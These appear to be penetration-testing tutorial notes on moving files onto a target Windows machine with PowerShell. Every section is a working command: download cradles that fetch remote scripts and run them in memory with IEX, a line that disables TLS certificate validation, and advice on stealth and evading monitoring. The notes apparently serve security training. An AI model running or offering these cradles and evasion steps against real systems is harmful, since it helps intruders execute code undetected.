

**Why use PowerShell?**  
Most companies allow **HTTP/HTTPS traffic**, which means you can often use it to download files — even when other protocols are blocked.

Be aware:

- Some environments block certain file types (like `.exe` files).
    
- Some only allow approved domains.
    
- Web filtering may still flag suspicious traffic.
    

---

## 1. Using `System.Net.WebClient`

PowerShell’s `WebClient` class provides several methods to download or stream files.  
The most common methods are:

|**Method**|**Use**|
|---|---|
|**DownloadFile**|Save a file to disk.|
|**DownloadString**|Load a script or text into memory.|
|**OpenRead / DownloadData**|Return file content as a stream or byte array.|

---

### **A. Download a File**

On the **target machine**:

```powershell
(New-Object Net.WebClient).DownloadFile('https://example.com/file.exe', 'C:\Users\Public\file.exe')
```

This saves the file into `C:\Users\Public`.

---

### **B. Async Download**

Run the download without locking your session:

```powershell
(New-Object Net.WebClient).DownloadFileAsync('https://example.com/file.exe', 'C:\Users\Public\file.exe')
```

---

### **C. Fileless Execution (In-Memory)**

No file is written to disk:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://example.com/script.ps1')
```

Or:

```powershell
(New-Object Net.WebClient).DownloadString('https://example.com/script.ps1') | IEX
```

This is often used for stealth operations.

---

## 2. Using `Invoke-WebRequest` (aka `iwr`, `curl`, `wget`)

```powershell
Invoke-WebRequest 'https://example.com/script.ps1' -OutFile 'C:\Users\Public\PowerView.ps1'
```

**Notes:**

- Slower than `WebClient`, but versatile and built-in.
    

---

## 3. Fixing Common Errors

### **A. Internet Explorer Initialization**

If you see errors about Internet Explorer settings:

```powershell
Invoke-WebRequest https://<IP>/PowerView.ps1 -UseBasicParsing | IEX
```

---

### **B. SSL/TLS Certificate Errors**

Bypass invalid certificate checks:

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

Then retry your download.

---

## 4. Best Practices

- Always test your commands on a non-production environment first.
    
- Use in-memory execution for stealth when disk writes may be monitored.
    
- For restricted environments, review Harmj0y’s [PowerShell download cradles](https://gist.github.com/HarmJ0y/bb48307ffa663256e239) for advanced evasion techniques.
    

---
